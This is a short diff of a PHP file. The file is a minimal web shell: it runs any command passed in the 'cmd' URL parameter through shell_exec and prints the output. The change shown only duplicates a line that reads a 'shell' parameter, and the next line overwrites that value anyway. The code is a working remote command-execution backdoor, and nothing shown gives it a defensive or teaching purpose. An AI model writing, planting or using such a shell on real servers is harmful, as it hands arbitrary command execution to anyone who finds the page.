@@ -2,6 +2,8 @@
 
 $cmd =  $_GET['shell'];
 
+$cmd =  $_GET['shell'];
+
 $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'ls -la';
 $output = shell_exec($cmd . ' 2>&1');
 ?>
